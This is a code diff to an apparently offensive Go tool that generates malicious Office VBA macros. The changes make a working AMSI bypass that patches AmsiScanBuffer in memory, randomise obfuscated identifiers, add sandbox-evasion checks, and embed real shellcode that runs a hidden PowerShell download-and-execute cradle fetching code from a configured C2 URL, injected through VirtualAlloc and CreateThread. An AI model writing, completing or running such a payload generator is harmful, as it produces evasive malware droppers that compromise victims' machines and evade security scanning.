@@ -1,7 +1,9 @@
 package payload
 
 import (
+	cryptorand "crypto/rand"
 	"encoding/base64"
+	"encoding/binary"
 	"fmt"
 	"math/rand"
 	"strings"
@@ -68,13 +70,13 @@ func (p *macroVarPool) nextFunc() string {
 	}
 }
 
-func obfuscateVBAString(s string, split bool) string {
+func obfuscateVBAString(p *macroVarPool, s string, split bool) string {
 	if !split {
 		return fmt.Sprintf("%q", s)
 	}
 	parts := make([]string, 0)
 	for i := 0; i < len(s); {
-		chunkLen := 3 + rand.Intn(5)
+		chunkLen := 3 + p.rng.Intn(5)
 		if i+chunkLen > len(s) {
 			chunkLen = len(s) - i
 		}
@@ -89,8 +91,28 @@ func vbCrLf() string {
 }
 
 func GenerateMacroVBA(config MacroConfig) (string, error) {
-	seed := time.Now().UnixNano()
+	// Seed the variable-name pool from crypto/rand so generated identifiers
+	// are not predictable from wall-clock time.
+	var seedBytes [8]byte
+	if _, err := cryptorand.Read(seedBytes[:]); err != nil {
+		return "", fmt.Errorf("crypto/rand failed for macro seed: %w", err)
+	}
+	seed := int64(binary.LittleEndian.Uint64(seedBytes[:]))
 	vars := newMacroVarPool(seed)
+
+	// Win32 API names shared between the payload Declare blocks and the AMSI
+	// bypass body. Computed up front so both sites reference the same
+	// (possibly randomized) identifiers.
+	virtAlloc := "VirtualAlloc"
+	copyMem := "RtlMoveMemory"
+	createThread := "CreateThread"
+	waitFor := "WaitForSingleObject"
+	if config.Obfuscate {
+		virtAlloc = vars.nextFunc()
+		copyMem = vars.nextFunc()
+		createThread = vars.nextFunc()
+		waitFor = vars.nextFunc()
+	}
 
 	var sb strings.Builder
 
@@ -102,35 +124,51 @@ func GenerateMacroVBA(config MacroConfig) (string, error) {
 		sb.WriteString("'\n")
 	}
 
+	// AMSI bypass API names (LoadLibrary / GetProcAddress always declared here;
+	// RtlMoveMemory is declared here only when the payload block below does
+	// not already declare it for binary/dll payloads).
+	amsiGPA := "GetProcAddress"
+	amsiLL := "LoadLibrary"
+	amsiVP := "VirtualProtect"
+	amsiRTL := copyMem
 	if config.AMSIBypass {
 		if config.Comments {
 			sb.WriteString("' AMSI Bypass: patch AmsiScanBuffer\n")
 		}
 		if config.Obfuscate {
-			sb.WriteString(fmt.Sprintf("Private Declare PtrSafe Function %s Lib \"kernel32\" Alias \"GetProcAddress\" _\n", vars.nextFunc()))
+			amsiGPA = vars.nextFunc()
+			amsiLL = vars.nextFunc()
+			sb.WriteString(fmt.Sprintf("Private Declare PtrSafe Function %s Lib \"kernel32\" Alias \"GetProcAddress\" _\n", amsiGPA))
 			sb.WriteString(fmt.Sprintf("    (ByVal %s As LongPtr, ByVal %s As String) As LongPtr\n", vars.next(), vars.next()))
-			sb.WriteString(fmt.Sprintf("Private Declare PtrSafe Function %s Lib \"kernel32\" Alias \"LoadLibraryA\" _\n", vars.nextFunc()))
+			sb.WriteString(fmt.Sprintf("Private Declare PtrSafe Function %s Lib \"kernel32\" Alias \"LoadLibraryA\" _\n", amsiLL))
 			sb.WriteString(fmt.Sprintf("    (ByVal %s As String) As LongPtr\n", vars.next()))
 		} else {
 			sb.WriteString("Private Declare PtrSafe Function GetProcAddress Lib \"kernel32\" (ByVal hModule As LongPtr, ByVal lpProcName As String) As LongPtr\n")
 			sb.WriteString("Private Declare PtrSafe Function LoadLibrary Lib \"kernel32\" Alias \"LoadLibraryA\" (ByVal lpLibFileName As String) As LongPtr\n")
+		}
+
+		if config.Obfuscate {
+			amsiVP = vars.nextFunc()
+		}
+		sb.WriteString(fmt.Sprintf("Private Declare PtrSafe Function %s Lib \"kernel32\" Alias \"VirtualProtect\" _\n", amsiVP))
+		sb.WriteString(fmt.Sprintf("    (ByVal %s As LongPtr, ByVal %s As Long, _\n", vars.next(), vars.next()))
+		sb.WriteString(fmt.Sprintf("     ByVal %s As Long, ByRef %s As LongPtr) As Long\n", vars.next(), vars.next()))
+
+		// RtlMoveMemory is declared below for binary/dll payloads; only declare
+		// it here for payload types that do not bring their own.
+		needsOwnRTL := config.PayloadType != "binary" && config.PayloadType != "dll"
+		if needsOwnRTL {
+			if config.Obfuscate {
+				amsiRTL = vars.nextFunc()
+			}
+			sb.WriteString(fmt.Sprintf("Private Declare PtrSafe Sub %s Lib \"kernel32\" Alias \"RtlMoveMemory\" _\n", amsiRTL))
+			sb.WriteString(fmt.Sprintf("    (ByVal %s As LongPtr, ByRef %s As Any, ByVal %s As Long)\n", vars.next(), vars.next(), vars.next()))
 		}
 	}
 
 	if config.PayloadType == "binary" || config.PayloadType == "dll" {
 		if config.Comments {
 			sb.WriteString("' Win32 API declarations\n")
-		}
-		virtAlloc := "VirtualAlloc"
-		copyMem := "RtlMoveMemory"
-		createThread := "CreateThread"
-		waitFor := "WaitForSingleObject"
-
-		if config.Obfuscate {
-			virtAlloc = vars.nextFunc()
-			copyMem = vars.nextFunc()
-			createThread = vars.nextFunc()
-			waitFor = vars.nextFunc()
 		}
 
 		vaSize := vars.next()
@@ -191,20 +229,19 @@ func GenerateMacroVBA(config MacroConfig) (string, error) {
 			procInfo = vars.nextFunc()
 		}
 
+		// Mirror the native x64 STARTUPINFO layout exactly (15 members,
+		// cb = Len(si) = 80): cb + 3 pointers + 8 DWORDs + 2 WORDs + pointer.
 		sb.WriteString(fmt.Sprintf("Private Type %s\n", startupInfo))
-		sb.WriteString(fmt.Sprintf("    %s As Long\n", vars.next()))
-		sb.WriteString(fmt.Sprintf("    %s As LongPtr\n", vars.next()))
-		sb.WriteString(fmt.Sprintf("    %s As LongPtr\n", vars.next()))
-		sb.WriteString(fmt.Sprintf("    %s As LongPtr\n", vars.next()))
-		sb.WriteString(fmt.Sprintf("    %s As Long\n", vars.next()))
-		sb.WriteString(fmt.Sprintf("    %s As Long\n", vars.next()))
-		sb.WriteString(fmt.Sprintf("    %s As Long\n", vars.next()))
-		sb.WriteString(fmt.Sprintf("    %s As Long\n", vars.next()))
-		sb.WriteString(fmt.Sprintf("    %s As Long\n", vars.next()))
-		sb.WriteString(fmt.Sprintf("    %s As Long\n", vars.next()))
-		sb.WriteString(fmt.Sprintf("    %s As LongPtr\n", vars.next()))
-		sb.WriteString(fmt.Sprintf("    %s As LongPtr\n", vars.next()))
-		sb.WriteString(fmt.Sprintf("    %s As LongPtr\n", vars.next()))
+		siFieldTypes := []string{
+			"Long", // cb
+			"LongPtr", "LongPtr", "LongPtr", // lpReserved, lpDesktop, lpTitle
+			"Long", "Long", "Long", "Long", "Long", "Long", "Long", "Long", // dwX .. dwFlags
+			"Integer", "Integer", // wShowWindow, cbReserved2
+			"LongPtr", // lpReserved2
+		}
+		for _, ft := range siFieldTypes {
+			sb.WriteString(fmt.Sprintf("    %s As %s\n", vars.next(), ft))
+		}
 		sb.WriteString("End Type\n\n")
 
 		sb.WriteString(fmt.Sprintf("Private Type %s\n", procInfo))
@@ -305,22 +342,19 @@ func GenerateMacroVBA(config MacroConfig) (string, error) {
 		sb.WriteString(fmt.Sprintf("Sub %s()\n", bypassAMSIFunc))
 		sb.WriteString(fmt.Sprintf("    Dim %s As LongPtr\n", hLibVar))
 		sb.WriteString(fmt.Sprintf("    Dim %s As LongPtr\n", procAddrVar))
-		sb.WriteString(fmt.Sprintf("    Dim %s As Long\n", patchBytesVar))
+		sb.WriteString(fmt.Sprintf("    Dim %s(0 To 5) As Byte\n", patchBytesVar))
 		sb.WriteString(fmt.Sprintf("    Dim %s As LongPtr\n", oldProtectVar))
-		sb.WriteString(fmt.Sprintf("    Dim %s As LongPtr\n", dummyVar))
-		if config.Obfuscate {
-			sb.WriteString(fmt.Sprintf("    %s = %s(%s)\n", hLibVar, "LoadLibrary", obfuscateVBAString("amsi.dll", config.SplitStrings)))
-		} else {
-			sb.WriteString(fmt.Sprintf("    %s = LoadLibrary(%s)\n", hLibVar, obfuscateVBAString("amsi.dll", config.SplitStrings)))
+		sb.WriteString(fmt.Sprintf("    Dim %s As Long\n", dummyVar))
+		sb.WriteString(fmt.Sprintf("    %s = %s(%s)\n", hLibVar, amsiLL, obfuscateVBAString(vars, "amsi.dll", config.SplitStrings)))
+		sb.WriteString(fmt.Sprintf("    %s = %s(%s, %s)\n", procAddrVar, amsiGPA, hLibVar, obfuscateVBAString(vars, "AmsiScanBuffer", config.SplitStrings)))
+		// mov eax, 0x80070057 (E_INVALIDARG); ret — makes AmsiScanBuffer a no-op.
+		patchBytes := []byte{0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3}
+		for i, b := range patchBytes {
+			sb.WriteString(fmt.Sprintf("    %s(%d) = &H%02X\n", patchBytesVar, i, b))
 		}
-		if config.Obfuscate {
-			sb.WriteString(fmt.Sprintf("    %s = %s(%s, %s)\n", procAddrVar, "GetProcAddress", hLibVar, obfuscateVBAString("AmsiScanBuffer", config.SplitStrings)))
-		} else {
-			sb.WriteString(fmt.Sprintf("    %s = GetProcAddress(%s, %s)\n", procAddrVar, hLibVar, obfuscateVBAString("AmsiScanBuffer", config.SplitStrings)))
-		}
-		sb.WriteString(fmt.Sprintf("    %s = &H80070057\n", patchBytesVar))
-		sb.WriteString(fmt.Sprintf("    %s = VirtualProtect(%s, 1, &H40, %s)\n", dummyVar, procAddrVar, oldProtectVar))
-		sb.WriteString(fmt.Sprintf("    %s = &H80070057\n", patchBytesVar))
+		sb.WriteString(fmt.Sprintf("    %s = %s(%s, 6, &H40, %s)\n", dummyVar, amsiVP, procAddrVar, oldProtectVar))
+		sb.WriteString(fmt.Sprintf("    %s %s, %s(0), 6\n", amsiRTL, procAddrVar, patchBytesVar))
+		sb.WriteString(fmt.Sprintf("    %s = %s(%s, 6, %s, %s)\n", dummyVar, amsiVP, procAddrVar, oldProtectVar, oldProtectVar))
 		sb.WriteString("End Sub\n\n")
 	}
 
@@ -335,9 +369,9 @@ func GenerateMacroVBA(config MacroConfig) (string, error) {
 		sb.WriteString(fmt.Sprintf("    Dim %s As String\n", userNameVar))
 
 		if config.Obfuscate {
-			sb.WriteString(fmt.Sprintf("    %s = Environ(%s)\n", procCountVar, obfuscateVBAString("NUMBER_OF_PROCESSORS", config.SplitStrings)))
-			sb.WriteString(fmt.Sprintf("    %s = Environ(%s)\n", compNameVar, obfuscateVBAString("COMPUTERNAME", config.SplitStrings)))
-			sb.WriteString(fmt.Sprintf("    %s = Environ(%s)\n", userNameVar, obfuscateVBAString("USERNAME", config.SplitStrings)))
+			sb.WriteString(fmt.Sprintf("    %s = Environ(%s)\n", procCountVar, obfuscateVBAString(vars, "NUMBER_OF_PROCESSORS", config.SplitStrings)))
+			sb.WriteString(fmt.Sprintf("    %s = Environ(%s)\n", compNameVar, obfuscateVBAString(vars, "COMPUTERNAME", config.SplitStrings)))
+			sb.WriteString(fmt.Sprintf("    %s = Environ(%s)\n", userNameVar, obfuscateVBAString(vars, "USERNAME", config.SplitStrings)))
 			sb.WriteString(fmt.Sprintf("    If %s < \"2\" Then\n", procCountVar))
 			sb.WriteString(fmt.Sprintf("        %s = True\n", sandboxCheckFunc))
 		} else {
@@ -355,7 +389,7 @@ func GenerateMacroVBA(config MacroConfig) (string, error) {
 		sb.WriteString(fmt.Sprintf("    For Each %s In Array(%s)\n", svVar, func() string {
 			quoted := make([]string, len(sandboxNames))
 			for i, n := range sandboxNames {
-				quoted[i] = obfuscateVBAString(n, config.SplitStrings)
+				quoted[i] = obfuscateVBAString(vars, n, config.SplitStrings)
 			}
 			return strings.Join(quoted, ", ")
 		}()))
@@ -405,7 +439,7 @@ func GenerateMacroVBA(config MacroConfig) (string, error) {
 		sb.WriteString(fmt.Sprintf("    %s.dwFlags = &H00000001\n", si))
 
 		if config.Obfuscate {
-			sb.WriteString(fmt.Sprintf("    %s = %s\n", cmdVar, obfuscateVBAString(psCmd, config.SplitStrings)))
+			sb.WriteString(fmt.Sprintf("    %s = %s\n", cmdVar, obfuscateVBAString(vars, psCmd, config.SplitStrings)))
 		} else {
 			sb.WriteString(fmt.Sprintf("    %s = %q\n", cmdVar, psCmd))
 		}
@@ -413,7 +447,7 @@ func GenerateMacroVBA(config MacroConfig) (string, error) {
 		sb.WriteString(fmt.Sprintf("    %s = %s(vbNullString, %s, 0, 0, 0, 0x08000000, 0, vbNullString, %s, %s)\n",
 			retVal, createProcFunc, cmdVar, si, pi))
 		sb.WriteString(fmt.Sprintf("    If %s = 0 Then\n", retVal))
-		sb.WriteString(fmt.Sprintf("        MsgBox %s\n", obfuscateVBAString("Error", config.SplitStrings)))
+		sb.WriteString(fmt.Sprintf("        MsgBox %s\n", obfuscateVBAString(vars, "Error", config.SplitStrings)))
 		sb.WriteString("    End If\n")
 
 	case "binary":
@@ -422,25 +456,35 @@ func GenerateMacroVBA(config MacroConfig) (string, error) {
 		tidVar := vars.next()
 		hThreadVar := vars.next()
 
-		virtAllocFunc := "VirtualAlloc"
-		copyMemFunc := "RtlMoveMemory"
-		createThreadFunc := "CreateThread"
-		waitForFunc := "WaitForSingleObject"
-		if config.Obfuscate {
-			virtAllocFunc = vars.nextFunc()
-			copyMemFunc = vars.nextFunc()
-			createThreadFunc = vars.nextFunc()
-			waitForFunc = vars.nextFunc()
+		// Build a real x64 shellcode for the configured PowerShell command so
+		// the generated macro actually embeds and executes payload bytes.
+		binCmd := config.PowerShellCmd
+		if binCmd == "" && config.C2URL != "" {
+			binCmd = fmt.Sprintf("powershell -NoP -NonI -W Hidden -Exec Bypass -c \"IEX(New-Object Net.WebClient).DownloadString('%s')\"", config.C2URL)
+		}
+		shellcode, err := GenerateBasicShellcode(binCmd)
+		if err != nil {
+			return "", fmt.Errorf("binary payload shellcode: %w", err)
+		}
+		if len(shellcode) > 32767 {
+			shellcode = shellcode[:32767]
 		}
 
-		sb.WriteString(fmt.Sprintf("    Dim %s(0 To 0) As Byte\n", scVar))
+		sb.WriteString(fmt.Sprintf("    Dim %s(0 To %d) As Byte\n", scVar, len(shellcode)-1))
 		sb.WriteString(fmt.Sprintf("    Dim %s As LongPtr\n", ptrVar))
 		sb.WriteString(fmt.Sprintf("    Dim %s As Long\n", tidVar))
 		sb.WriteString(fmt.Sprintf("    Dim %s As LongPtr\n", hThreadVar))
-		sb.WriteString(fmt.Sprintf("    %s = %s(0, 0, &H1000, &H40)\n", ptrVar, virtAllocFunc))
-		sb.WriteString(fmt.Sprintf("    %s %s, %s(0), 0\n", copyMemFunc, ptrVar, scVar))
-		sb.WriteString(fmt.Sprintf("    %s = %s(0, 0, %s, 0, 0, %s)\n", hThreadVar, createThreadFunc, ptrVar, tidVar))
-		sb.WriteString(fmt.Sprintf("    %s %s, -1\n", waitForFunc, hThreadVar))
+		for i := 0; i < len(shellcode); i += 8 {
+			parts := make([]string, 0, 8)
+			for j := i; j < len(shellcode) && j < i+8; j++ {
+				parts = append(parts, fmt.Sprintf("%s(%d) = &H%02X", scVar, j, shellcode[j]))
+			}
+			sb.WriteString("    " + strings.Join(parts, ": ") + "\n")
+		}
+		sb.WriteString(fmt.Sprintf("    %s = %s(0, 0, &H1000, &H40)\n", ptrVar, virtAlloc))
+		sb.WriteString(fmt.Sprintf("    %s %s, %s(0), %d\n", copyMem, ptrVar, scVar, len(shellcode)))
+		sb.WriteString(fmt.Sprintf("    %s = %s(0, 0, %s, 0, 0, %s)\n", hThreadVar, createThread, ptrVar, tidVar))
+		sb.WriteString(fmt.Sprintf("    %s %s, -1\n", waitFor, hThreadVar))
 
 	case "dll":
 		dllPathVar := vars.next()
@@ -448,7 +492,7 @@ func GenerateMacroVBA(config MacroConfig) (string, error) {
 		sb.WriteString(fmt.Sprintf("    Dim %s As String\n", dllPathVar))
 		sb.WriteString(fmt.Sprintf("    Dim %s As LongPtr\n", procVar))
 		if config.Obfuscate {
-			sb.WriteString(fmt.Sprintf("    %s = %s\n", dllPathVar, obfuscateVBAString("rundll32.exe", config.SplitStrings)))
+			sb.WriteString(fmt.Sprintf("    %s = %s\n", dllPathVar, obfuscateVBAString(vars, "rundll32.exe", config.SplitStrings)))
 		} else {
 			sb.WriteString(fmt.Sprintf("    %s = \"rundll32.exe\"\n", dllPathVar))
 		}
